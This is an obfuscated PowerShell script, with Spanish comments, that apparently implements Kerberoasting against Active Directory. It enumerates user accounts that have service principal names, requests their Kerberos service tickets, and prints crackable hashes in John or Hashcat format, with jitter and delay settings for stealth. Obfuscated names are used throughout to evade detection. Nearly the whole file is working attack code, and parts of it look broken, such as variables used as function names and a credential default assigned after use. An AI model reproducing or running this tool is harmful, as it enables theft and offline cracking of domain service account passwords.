# ENUMS OFUSCADOS
${U}=@{SCRIPT=1;ACCOUNTDISABLE=2;NORMAL_ACCOUNT=512;USE_DES_KEY_ONLY=2097152;DONT_REQ_PREAUTH=4194304};
${S}=@{GROUP=268435456;DOMAIN_GROUP=536870912;LOCAL_GROUP=805306368};
${G}=@{DOMAIN_LOCAL_GROUP=-2147483644;SECURITY_ENABLED=2147483648};

function ${s1} { # Get-SearchDomain
    param(${d},${f},${p},${b},${p1},${v},${c}=${s2},${r}=200,${t}=120,${m},${t1},${c1});
    ${dd}=if(${d}){${d}}else{[adsi]'LDAP://RootDSE' |%{$_.defaultNamingContext}};
    ${sv}=if(${v}){${v}}else{([adsi]"LDAP://RootDSE").dnsHostName};
    ${ss}="LDAP://${sv}/${dd}";
    if(${c1}){${de}=New-Object DirectoryServices.DirectoryEntry(${ss},${c1}.UserName,${c1}.GetNetworkCredential().Password)}
    else{${de}=[ADSI]${ss}};
    ${sr}=New-Object DirectoryServices.DirectorySearcher(${de});
    ${sr}.PageSize=${r};${sr}.SearchScope=${c};${sr}.CacheResults=$false;${sr}.ReferralChasing='All';
    if(${t}){${sr}.ServerTimeLimit=${t}};if(${t1}){${sr}.Tombstone=$true};if(${f}){${sr}.Filter=${f}};
    if(${p}){${p}|%{${sr}.PropertiesToLoad.AddRange(${p}.Split(','))}};
    ${sr}
}

function ${s3} { # Convert-PropertyLDAP
    param([Parameter(Mandatory=$true,ValueFromPipeline=$true)]${p});
    ${o}=@{};
    ${p}.PropertyNames|%{if($_-ne'adspath'){if(($_-eq'objectsid')-or($_-eq'sidhistory')){${o}[${_}]=${p}[${_}]|%{[Security.Principal.SecurityIdentifier]$_,0}.Value}elseif($_-eq'objectguid'){${o}[${_}]=(New-Object Guid(,${p}[${_}][0])).Guid}elseif($_-eq'accountexpires'){if(${p}[${_}][0]-gt[DateTime]::MaxValue.Ticks){${o}[${_}]='NEVER'}else{${o}[${_}]=[datetime]::fromfiletime(${p}[${_}][0])}}elseif(($_-in@('lastlogon','lastlogontimestamp','pwdlastset'))){${o}[${_}]=[datetime]::FromFileTime(${p}[${_}][0])}elseif(${p}[${_}].count-eq1){${o}[${_}]=${p}[${_}][0]}else{${o}[${_}]=${p}[${_}]}}};
    [PSCustomObject]${o}
}

function ${s4} { # Get-Domain
    param(${d},${c}=${s2});
    if(${c}){${dc}=New-Object DirectoryServices.ActiveDirectory.DirectoryContext('Domain',if(${d}){${d}}else{${c}.GetNetworkCredential().Domain},${c}.UserName,${c}.GetNetworkCredential().Password);[DirectoryServices.ActiveDirectory.Domain]::GetDomain(${dc})}
    elseif(${d}){${dc}=New-Object DirectoryServices.ActiveDirectory.DirectoryContext('Domain',${d});[DirectoryServices.ActiveDirectory.Domain]::GetDomain(${dc})}
    else{[DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()}
}

function ${s5} { # Get-Ticket
    param(${s},${u},${o}='John',${l}=0,${j}=.3,${c}=${s2});
    ${a}=[Reflection.Assembly]::LoadWithPartialName('System.IdentityModel');
    if(${c}){${t}=Invoke-UserImpersonation -Credential ${c}};
    ${r}=New-Object Random;
    ${s}|%{${spn}=$_;${un}='UNKNOWN';${dn}='UNKNOWN';try{${tk}=New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken(${spn});${bs}=${tk}.GetRequest();${hx}=[BitConverter]::ToString(${bs})-replace'-';if(${hx}-match'a382....3082....A0030201(?<e>..)A1.{1,4}.......A282(?<l>....)........(?<d>.+)'){${el}=[Convert]::ToByte($matches.e,16);${cl}=[Convert]::ToUInt32($matches.l,16)-4;${ct}=$matches.d.Substring(0,${cl}*2);if($matches.d.Substring(${cl}*2,4)-ne'A482'){${h}=$null}else{${h}="${ct}".Substring(0,32)+"`$"+${ct}.Substring(32)};if(${h}){if(${o}-eq'John'){Write-Output "`$krb5tgs`$${spn}:$h"}else{Write-Output "`$krb5tgs`$$el`*${un}`$$dn`$${spn}*`$h"}}}}catch{}};Start-Sleep(${r}.Next((1-${j})*${l},(1+${j})*${l})};
    if(${t}){Invoke-RevertToSelf -TokenHandle ${t}}
}

function ${s6} { # Get-UserDomain
    param(${i},${s1},${a},${al},${dl},${ta},${pr},${d},${f},${p},${b},${v},${c}=${s2},${r}=200,${t},${m},${t1},${o},${c1},${w});
    ${sa}=@{${d}=${d};${p}=${p};${b}=${b};${v}=${v};${c}=${c};${r}=${r};${t}=${t};${m}=${m};${t1}=${t1};${c1}=${c1}};
    ${us}=${s1} @${sa};
    if(${us}){${if}='';${fl}='';${i}|?{$_}|%{${ii}=$_.Replace('(','\\28').Replace(')','\\29');if(${ii}-match'^S-1-'){${if}+="(objectsid=$ii)"}elseif(${ii}-match'^CN='){${if}+="(distinguishedname=$ii)"}else{${if}+="(samAccountName=$ii)"}};if(${if}){${fl}+="(|$if)"};if(${s1}){${fl}+='(servicePrincipalName=*)'};${us}.filter="(&(samAccountType=805306368)${fl})";${res}=if(${o}){${us}.FindOne()}else{${us}.FindAll()};${res}|?{$_}|%{if(${w}){${u}=$_;${u}.PSObject.TypeNames.Insert(0,'User.Raw')}else{${u}=${s3} -Properties $_.Properties;${u}.PSObject.TypeNames.Insert(0,'User')};${u}};if(${res}){${res}.dispose()};${us}.dispose()}
}

# FUNCIÓN PRINCIPAL OFUSCADA
function Invoke-KerberoastPS {
    param(${i},${d},${f},${b},${v},${c}='Subtree',${r}=200,${t},${t1},${l}=0,${j}=.3,${o}='John',${c1}=${s2});
    ${ua}=@{SPN=$true;Properties='samaccountname,distinguishedname,serviceprincipalname';Domain=${d};LDAPFilter=${f};SearchBase=${b};Server=${v};SearchScope=${c};ResultPageSize=${r};ServerTimeLimit=${t};Tombstone=${t1};Credential=${c1}};
    if(${i}){${ua}.Identity=${i}};
    ${s6} @${ua} |?{$_.samaccountname-ne'krbtgt'} | ${s5} -Delay ${l} -OutputFormat ${o} -Jitter ${j} -Credential ${c1}
}

# ALIAS Y EJECUCIÓN
${s2}=[Management.Automation.PSCredential]::Empty;
Set-Alias ik Invoke-KerberoastPS;
